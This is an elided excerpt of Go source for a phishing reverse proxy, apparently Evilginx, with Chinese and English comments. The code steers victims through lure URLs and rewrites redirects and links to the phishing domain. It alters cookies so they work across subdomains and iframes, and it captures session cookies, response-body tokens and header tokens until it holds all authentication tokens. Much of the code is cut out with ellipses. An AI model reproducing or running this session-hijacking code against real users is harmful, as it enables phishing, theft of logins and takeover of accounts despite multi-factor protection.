...
此源文件是从出色的 bettercap (https://github.com/bettercap/bettercap) 项目中获取的修改版本。
感谢 Simone Margaritelli (@evilsocket) 提供的出色代码！
...
// 原文借自 Modlishka 项目 (https://github.com/drk1wi/Modlishka)
...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	...
	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO：使 cookie 名称可识别
		...
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			if phished {
				...
				if p.handleSession(req.Host) && pl != nil {
					...
					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO：检测到诱饵 URL 时始终触发新会话（仅在完成此操作后才检查白名单 IP)
						// 未找到会话 cookie
				...
				//X-Evilginx标头 req.Header.Set(p.getHomeDir(), o_host)
				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
						if err == nil {
							// 如果为当前诱饵设置了 html 重定向器，则显示它
							if l.Redirector != "" {
				...
				// 检查诱饵主机名是否被触发 - 现在所有的诱饵主机名处理都应该完成了，所以我们可以退出了
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			// 如果存在“Location”标头，请确保重定向到网络钓鱼域 if "Location" header is present, make sure to redirect to the phishing domain
			...
			for _, ck := range cookies {
				// 解析 cookie （parse cookie）

				// 为每个收到的 cookie 添加 SameSite=none，以允许通过 iframe 使用 cookie（add SameSite=none for every received cookie, allowing cookies through iframes）（
				if ck.Secure {
				...
				if pl != nil && ps.SessionId != "" {
					...
					if c_domain == "" {
						...
						// 如果指定了域 cookie，则始终在域前面添加“。” - 这将表明此 cookie 也将发送到所有子域（always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains）
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					...
					if at != nil {
						...
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // 值为空或过期的 cookie 对我们来说毫无意义(cookies with empty values or expired cookies are of no interest to us)
			...
			// 修改接收主体(modify received body)
			body, err := ioutil.ReadAll(resp.Body)

			if pl != nil {
				if s, ok := p.sessions[ps.SessionId]; ok {
					// 捕获身体反应标记(capture body response tokens)
					...
					// 捕获 http 标头标记(capture http header tokens)
				...
				// 检查是否拥有所有 token(check if we have all tokens)
			...
			if is_cookie_auth && is_body_auth && is_http_auth {
				// 我们拥有所有身份验证令牌(we have all auth tokens)
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
			...
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						...
						// 处理自动过滤器（如果启用）(handle auto filters (if enabled))
				...
				if stringExists(mime, []string{"text/html"}) {
					...
					if pl != nil && ps.SessionId != "" {
						...
						if ok {
							if s.PhishLure != nil {
								// 注入 opengraph 标头(inject opengraph headers)
								l := s.PhishLure
...
//                          仅当收到的响应内容属于“text/html”内容类型时才进行重定向(redirect only if received response content is of `text/html` content type)
							s.RedirectCount += 1
...
func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {
	...
	// 生成转发器参数(generate forwarder parameter)
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
...
func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	...
	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		...
		// 确保我们从最长到最短的顺序替换字符串(make sure that we start replacing strings from longest to shortest)
...
func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // 丢弃虚假 CONNECT 请求的 HTTP OK 响应(throw away the HTTP OK response from the faux CONNECT request)
	}
